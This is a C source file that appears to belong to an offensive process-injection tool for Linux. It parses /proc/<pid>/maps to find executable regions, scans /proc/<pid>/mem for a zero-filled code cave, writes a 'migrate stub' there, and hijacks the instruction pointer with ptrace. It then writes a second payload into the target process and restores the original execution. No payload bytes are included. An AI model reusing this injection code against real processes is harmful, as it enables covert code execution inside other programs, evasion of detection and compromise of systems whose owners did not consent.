#include "base_inject.h"

char *get_permissions_from_line(char *line) {
      
   int first_space = -1;
      int second_space = -1;
      for (size_t i = 0; i < strlen(line); i++) {
          if (line[i] == ' ' && first_space == -1) {
              first_space = i + 1;
          }
          else if (line[i] == ' ' && first_space != -1) {
              second_space = i;
              break;
          }
      }

      if (first_space != -1 && second_space != -1 && second_space > first_space) {
          char *permissions = malloc(second_space - first_space + 1);
          if (permissions == NULL) {
              fprintf(stderr, "Could not allocate memory. Aborting.\n");
              return NULL;
          }
          for (size_t i = first_space, j = 0; i < (size_t)second_space; i++, j++) {
              permissions[j] = line[i];
          }
          permissions[second_space - first_space] = '\0';
          return permissions;
      }
      return NULL;

  }


long get_end_address_from_maps_line(char *line) {

      char *start_address = strchr(line, '-') + 1;
      char *address_line = malloc(SIZE_OF_ADDRESS + 1);
      memset(address_line, 0, SIZE_OF_ADDRESS + 1);
      memcpy(address_line, start_address, SIZE_OF_ADDRESS);
      long address = strtol(address_line, (char **) NULL, 16);
      return address;
}


long get_start_address_from_maps_line(char *line) {

      char *address_line = malloc(SIZE_OF_ADDRESS + 1);
      memset(address_line, 0, SIZE_OF_ADDRESS + 1);
      memcpy(address_line, line, SIZE_OF_ADDRESS);
      long address = strtol(address_line, (char **) NULL, 16);
      return address;
}


char* itoa(int val, int base){
	
	static char buf[32] = {0};
	
	int i = 30;
	
	for(; val && i ; --i, val /= base)
	
		buf[i] = "0123456789abcdef"[val % base];
	
	return &buf[i+1];
	
}

unsigned long find_codecave(int pid, long start, long end, int cave_size)
{
  char mem_file_path[80];
  FILE * mem_handler;
  char * mem_data; 

  strcpy(mem_file_path, "/proc/");

  strcat(mem_file_path, itoa(pid, 10));
  strcat(mem_file_path, "/mem");
  
  mem_handler = fopen(mem_file_path, "r");
  fseek(mem_handler, start, SEEK_SET);
  
  mem_data = malloc(sizeof(char)*(int)(end-start));
  fread(mem_data,sizeof(char), (int)(end-start), mem_handler);
  
  fclose(mem_handler);
  
  int current_cave_size = 0;
  
  for( char * mem_byte = mem_data; mem_byte < mem_data + (end-start); mem_byte++){
    if(*mem_byte != 0x00)
    {
      current_cave_size = 0;
      continue;
    }
    if(current_cave_size == cave_size)
    {
      printf("Found code cave: %d\n", current_cave_size); 

      free(mem_data);
      return start + ((unsigned long)mem_byte - (unsigned long)mem_data) - cave_size;
    }

    current_cave_size++;

  }

  free(mem_data);
  return 0;

};

int copy_payload(int pid, unsigned long target_addr, char * payload, int payload_length, long * restore_addr)
{
  
  //write payload to target file
  char mem_file_path[80];
  FILE * mem_handler;
  struct user_regs_struct regs;
  unsigned long original_rip;

  strcpy(mem_file_path, "/proc/");

  strcat(mem_file_path, itoa(pid, 10));
  strcat(mem_file_path, "/mem");
  
  mem_handler = fopen(mem_file_path, "w+");
  fseek(mem_handler, target_addr, SEEK_SET);
  
  fwrite(payload, sizeof(char), payload_length, mem_handler);
  
  fclose(mem_handler);
  
  getchar();
  
  //overwrite RIP using ptrace
  ptrace(PTRACE_ATTACH, pid, NULL, NULL);
  waitpid(pid, NULL, 0);

  ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACECLONE);
  
  ptrace(PTRACE_GETREGS, pid, NULL, &regs);

  original_rip = regs.rip;
  *restore_addr = (long)regs.rip;

  printf("Original RIP: %lx\n", original_rip);
  
  regs.rip = target_addr+2;
  
  ptrace(PTRACE_SETREGS, pid, NULL, &regs);

  return 1;
}

int inject_payload(int pid, long target_addr, char * payload, size_t payload_length){

  char mem_file_path[80];
  FILE * mem_handler;
  struct user_regs_struct regs;
  unsigned long original_rip;

  strcpy(mem_file_path, "/proc/");

  strcat(mem_file_path, itoa(pid, 10));
  strcat(mem_file_path, "/mem");
  
  mem_handler = fopen(mem_file_path, "w+");
  fseek(mem_handler, target_addr, SEEK_SET);
  
  fwrite(payload, sizeof(char), payload_length, mem_handler);
  
  fclose(mem_handler);
  
  return 1;
}

int inject_migrate_stub(int pid, char * migrate_stub, size_t migrate_stub_length, long * restore_addr){
  
  FILE * maps_handler;
  char maps_file_path[80];
  char * line = NULL;
  size_t len = 0;

  strcpy(maps_file_path, "/proc/");

  strcat(maps_file_path, itoa(pid, 10));
  strcat(maps_file_path, "/maps");
  
  maps_handler = fopen(maps_file_path, "r");
  
  char * permissions;
  long start_address;
  long end_address;

  while(getline(&line,&len, maps_handler) != -1)
  {
    printf("%s\n", line);
    permissions = get_permissions_from_line(line);

    char * permission = permissions;
    while(*permission != 0)
    {
      char permission_char = *permission;
      if(permission_char == 0x78)
        break;
      permission++;
    }
    
    if(*permission == 0)
      continue;
    
    start_address = get_start_address_from_maps_line(line);
    end_address = get_end_address_from_maps_line(line);

    long code_cave_address = find_codecave(pid,start_address, end_address, migrate_stub_length);
    if(code_cave_address){
      printf("Found code cave at: %lx\n", code_cave_address);
      getchar();

      if(copy_payload(pid, code_cave_address, migrate_stub, migrate_stub_length, restore_addr))
      {
        return 1;
      }
      break;
    }
  }
  
  free(maps_handler);

  return 0; 
}

void restore_parent(int pid,long original_rip)
{

  struct user_regs_struct regs;

  ptrace(PTRACE_GETREGS, pid, NULL, &regs);

  regs.rip = original_rip;
  
  ptrace(PTRACE_SETREGS, pid, NULL, &regs);
}

int migrate(int pid, char * migrate_stub, size_t migrate_stub_length, char * payload, size_t payload_length)
{
  int status;
  struct user_regs_struct regs;
  long restore_addr;
  
  //if injection fails, send detach and continue signals just in case 
  if(!inject_migrate_stub(pid,migrate_stub, migrate_stub_length, &restore_addr)){
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    ptrace(PTRACE_DETACH, pid, NULL, NULL);
    return 0;
  }
  
  ptrace(PTRACE_CONT, pid, NULL, NULL);
  //ptrace(PTRACE_DETACH, pid, NULL, NULL);
  
  //waits for first interrupt
  wait(&status);
  
  if(WIFSTOPPED(status) && WSTOPSIG(status) == 5)
  {

    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
    printf("%lx\n", regs.rip);
    long target_address = regs.rax;
    printf("%lx\n", regs.rax);
    printf("%lx\n", target_address);
    printf("%lx\n", restore_addr);
    
    if(!inject_payload(pid, target_address, payload, payload_length))
    {
       //TODO: restore data 
      ptrace(PTRACE_CONT, pid, NULL, NULL);
      ptrace(PTRACE_DETACH, pid, NULL, NULL);
      return 0;
    }
   
    ptrace(PTRACE_CONT, pid, NULL, NULL);
    wait(&status);

    if(WIFSTOPPED(status) && WSTOPSIG(status) == 5){
      restore_parent(pid, restore_addr);
      
      //kill(pid, SIGSTOP);
      ptrace(PTRACE_CONT, pid, NULL, NULL);
      ptrace(PTRACE_DETACH, pid, NULL, NULL);

      return 1;
    }

    printf("[-] Error wait\n");
    return 0;

  } else{
    printf("[-] Error wait\n");
  }
  return 0;
}
